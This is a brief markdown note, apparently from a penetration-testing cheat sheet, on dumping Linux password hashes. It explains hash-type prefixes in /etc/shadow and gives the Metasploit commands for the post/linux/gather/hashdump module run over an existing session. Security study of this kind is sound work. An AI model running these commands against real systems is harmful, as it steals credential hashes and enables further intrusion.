# Dumping Hashes using Hashdump

In Linux, passwords are stored in the form of hashes in the `/etc/shadow` file.
The type of hash used can be identified using the initial part of the hash:
- `$1` : MD5
- `$2` : Blowfish
- `$5` : SHA-256
- `$6` : SHA-512
- `$y` : YESCRYPT

```
use post/linux/gather/hashdump
set SESSION 2
exploit
```

This module will run and get all the hashes and these can be accessed in `loot`
